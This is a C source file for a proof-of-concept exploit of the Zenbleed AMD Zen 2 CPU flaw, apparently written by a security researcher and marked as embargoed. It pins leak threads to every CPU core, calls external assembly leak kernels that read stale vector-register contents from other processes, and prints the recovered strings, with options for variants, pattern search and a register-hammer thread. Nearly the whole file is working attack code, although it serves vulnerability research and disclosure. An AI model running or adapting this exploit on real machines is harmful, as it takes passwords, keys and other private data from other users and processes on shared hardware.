#define _GNU_SOURCE
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <stdbool.h>
#include <x86intrin.h>
#include <sched.h>
#include <syscall.h>
#include <err.h>
#include <pthread.h>
#include <assert.h>
#include <ctype.h>
#include <signal.h>
#include <sys/sysinfo.h>

#include "zenbleed.h"

//
// This is a Work-in-Progress testcase for the Zenbleed vulnerability.
//
// ** DO NOT DISTRIBUTE - EMBARGOED SECURITY ISSUE **
//
// Tavis Ormandy <taviso@google.com>
//

#define ZL_HAMMER_SECRET 0x5345435245543432

extern void zen2_leak_sls_insrb(uint64_t value[4]);
extern void zen2_leak_pepo_unrolled(uint64_t value[4]);
extern void zen2_leak_bench_pause(uint64_t value[4]);
extern void zen2_leak_train_mm0(uint64_t value[4]);
extern void zen2_hammer_xmmregisters();

static uint64_t maxleak;

static bool asciionly = true;
static bool secretonly = false;
static bool redact = false;

// Minor variations in alignment seem to make the exploit work better on
// different SKUs. These are some variants to try and see what works best.
static void * zen_leak_variants[] = {
    zen2_leak_pepo_unrolled,
    zen2_leak_sls_insrb,
    zen2_leak_bench_pause,
    zen2_leak_train_mm0,
};

typedef struct {
  int cpu_id;
  void (*zen_leak_callback)(uint64_t[4]);
} thread_arg_t;

// This thread just collects the leaked data from other threads.
static void * thread_leak_consumer(void *param)
{
    uint64_t cache[4] = {0};
    uint64_t total = 0;
    uint8_t *s;

    while (true) {
        struct zenleak *leak = NULL;
        size_t len = sizeof(leak->regbuf);

        leak = load_new_leak();

        // Get a pointer to the interesting part of the buffer.
        s = (void *) &leak->regbuf;

        // Check if we're benchmarking
        if (secretonly && leak->regbuf[2] != ZL_HAMMER_SECRET)
            goto boring;

        // Check if we have already printed this recently.
        if (memcmp(&leak->regbuf, cache, sizeof(cache)) == 0 && !secretonly) {
            goto boring;
        }

        // Find the first non-zero byte - we know for sure there is at least
        // one non-zero byte or the leak kernel would not return.
        while (*s == 0) len--, s++;

        // Some variants dont set flags reliably, so this can happen.
        if (len == 0) {
            goto boring;
        }

        // Optionally only print strings.
        if (asciionly) {
            for (int i = 0; i < len; i++) {
                if (!isprint(s[i]) && !isspace(s[i]) && s[i])
                    goto boring;
            }
        }

        print("Thread %02d: ", leak->cpu);
        fputc('"', stdout);

        for (int i = 0; i < len; i++, s++) {
            if (*s == 0) continue;

            // Escape any confusing characters
            if (*s == '"' || *s == '\\')
               if (!redact) fputc('\\', stdout);
            // Print normal ascii.
            if (isalnum(*s) || ispunct(*s)) {
                if (!redact) fputc(*s, stdout); 
                  else fputc('X',stdout);
            } else if (isspace(*s)) {
                fputc(' ', stdout);
            } else {
                fprintf(stdout, "\\x%02x", *s);
            }
        }

        fputc('"', stdout);
        fputc('\n', stdout);
        fflush(stdout);
        ++total;

        // Try to avoid duplicates spamming the console.
        memcpy(cache, leak->regbuf, sizeof(cache));

    boring:
        free(leak);

        if (maxleak && total == maxleak)
            break;
    }
    return 0;
}

// The main leaking loop, it just keeps waiting for a leak and then sends it to
// the consumer thread to be printed.
static void * thread_leak_producer(void *param)
{
    uint64_t cache[4] = {0};
    int cpu = sched_getcpu();
    thread_arg_t *arg = (thread_arg_t *)param;
    cpu_set_t mask;

    logmsg("Thread %p running on CPU %d", pthread_self(), cpu);

    // This seems to be unreliable on some systems.
    if (cpu != arg->cpu_id) {
        warnx("pthread_attr_setaffinity_np() not working as expected");
    }

    while (true) {
        struct zenleak *leak = calloc(sizeof *leak, 1);

        // Record which cpu this was found on.
        leak->cpu = cpu;

        // The leak kernel is an infinite loop, so need to enable cancellation.
        pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL);

        do {
            arg->zen_leak_callback(leak->regbuf);
            // Dont keep adding the same leak, we save a copy so we can compare
            // it against the previous result.
        } while (memcmp(leak->regbuf, cache, sizeof(cache)) == 0);

        // Save this to our cache.
        memcpy(cache, leak->regbuf, sizeof(cache));

        pthread_setcanceltype(PTHREAD_CANCEL_DEFERRED, NULL);

        //  Okay, this is a new result - add it to the workqueue.
        save_new_leak(leak);
    }

    return 0;
}

// This thread will keep putting a recognizable value in registers so that it
// can be easily spotted in debugger output.
static void * thread_leak_hammer(void *param)
{
    int cpu = sched_getcpu();

    logmsg("Hammer %p running on CPU %d", pthread_self(), cpu);

    // This is an infinite loop, so need to enable cancellation.
    pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL);

    zen2_hammer_xmmregisters();

    // Not reachable?
    abort();

    return 0;
}

// This wrapper spawns a thread locked to a specific CPU.
static pthread_t spawn_thread_core(void *(*start_routine)(void *), void *restrict arg, int cpu)
{
    pthread_t tid;
    pthread_attr_t attr;
    cpu_set_t set;

    // Just do nothing if there was no core specified.
    if (cpu < 0) return 0;

    pthread_attr_init(&attr);
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (pthread_attr_setaffinity_np(&attr, sizeof(cpu_set_t), &set) != 0)
        err(EXIT_FAILURE, "failed to lock thread to specified core %d", cpu);
    if (pthread_create(&tid, &attr, start_routine, arg) != 0)
        err(EXIT_FAILURE, "failed to start thread on specifed code %d", cpu);
    pthread_attr_destroy(&attr);
    return tid;
}

static void print_banner()
{
    logmsg("*** EMBARGOED SECURITY ISSUE --  DO NOT DISTRIBUTE! ***");
    logmsg("ZenBleed Testcase -- taviso@google.com");
    logmsg("");
    logmsg("NOTE: Try -h to see configuration options");
    logmsg("");
}

static void print_help()
{
    print_banner();

    logmsg("Usage: ./zenbleed [OPTIONS]");
    logmsg("   -v N    Select a variant leak kernel, different kernels work better on different SKUs.");
    logmsg("   -m N    Stop after leaking N values, useful for benchmarking.");
    logmsg("   -H N    Spawn a 'hammer' thread on core N, produces recognizable values for testing.");
    logmsg("   -t N    Give up after this many seconds.");
    logmsg("   -n N    Set nice level, can improve results on some systems.");
    logmsg("   -a      Print all data, not just ASCII strings.");
    logmsg("   -R      Redact output data with X's.");
    logmsg("   -s      Only print the magic hammer value (used for benchmarking).");
    logmsg("   -p STR  Pattern mode, try to continue string STR based on sampling leaked values.");
    logmsg("   -q      Quiet, reduce verbosity.");
    logmsg("   -r RNG  Restrict threads from these core numbers, e.g. 1,4,5,16-22.");
    logmsg("   -h      Print this message");
}

int main(int argc, char **argv) {
    int ncpus;
    int opt;
    int variant;
    int hammercpu;
    int prio;
    char *pattern;
    char *cores;
    pthread_t *threads;
    pthread_t consumer;
    pthread_t hammer;

    variant   = 3;        // Default leak kernel.
    maxleak   = 0;        // Stop after this many leaks.
    hammercpu = -1;       // Start a "hammer" thread to stress CPU registers, this makes recognizable values for testing.
    prio      = 20;       // Default priority.
    pattern   = 0;        // String to search for.
    cores     = 0;        // Which cpus to run on.

    while ((opt = getopt(argc, argv, "r:qRp:sat:n:hH:c:v:m:")) != -1) {
        switch (opt) {
            case 'v': variant = atoi(optarg);
                      break;
            case 'm': maxleak = atoi(optarg);
                      break;
            case 'H': hammercpu = atoi(optarg);
                      break;
            case 'h': print_help();
                      exit(0);
            case 't': alarm(atoi(optarg));
                      break;
            case 'n': prio = atoi(optarg);
                      break;
            case 'a': asciionly = false;
                      break;
            case 's': secretonly = true;
                      break;
            case 'p': pattern = optarg;
                      break;
            case 'q': quiet = true;
                      break;
            case 'R': redact = true;
                      break;
            case 'r': cores = optarg;
                      break;
            default:
                print_help();
                errx(EXIT_FAILURE, "unrecognized commandline argument");
        }
    }

    print_banner();

    nice(prio);

    // Make sure this option isn't going to crash.
    if (variant < 0 || variant >= sizeof(zen_leak_variants) / sizeof(*zen_leak_variants)) {
        errx(EXIT_FAILURE, "Invalid variant %d specified", variant);
    }

    // We spawn a thread on every evailable core and start leaking to see what we get.
    ncpus   = get_nprocs();
    thread_arg_t* args = calloc(sizeof(thread_arg_t), ncpus);
    threads = calloc(sizeof(pthread_t), ncpus);

    logmsg("Spawning %u Threads...", ncpus);

    for (int i = 0; i < ncpus; i++) {
        // Check if this cpu is restricted...
        if (num_inrange(cores, i))
            continue;

        args[i].cpu_id = i;
        args[i].zen_leak_callback = zen_leak_variants[variant];
        threads[i] = spawn_thread_core(thread_leak_producer, &args[i], i);
    }

    // This thread waits for leaked data from the producers.
    if (pattern) {
        pthread_create(&consumer, NULL, pattern_leak_consumer, pattern);
    } else {
        pthread_create(&consumer, NULL, thread_leak_consumer, NULL);
    }

    // Optionally spawn a "hammer" thread, which sets recognizable values in registers so it's easy
    // to spot when they leak. On some configurations/topologies there is a pairwise
    // relationship between which cores leak (e.g. with HT, maybe core 0 will leak values from core 1).
    // This can help figure that relationship out.
    hammer = spawn_thread_core(thread_leak_hammer, NULL, hammercpu);

    // Make sure any logs are printed.
    fflush(stdout);

    // Wait for the consumer to finish.
    pthread_join(consumer, NULL);

    // Now we have to tell all the other cores to stop.
    logmsg("The consumer thread completed, sending cancellation requests...");

    for (int i = 0; i < ncpus; i++) {
        if (threads[i]) pthread_cancel(threads[i]);
    }

    // There might be a hammer thread to clean up...
    if (hammer) {
        pthread_cancel(hammer);
        pthread_join(hammer, NULL);
    }

    for (int i = 0; i < ncpus; i++) {
        pthread_join(threads[i], NULL);
    }

    logmsg("All threads completed.");
    free(threads);
    free(args);
    return 0;
}
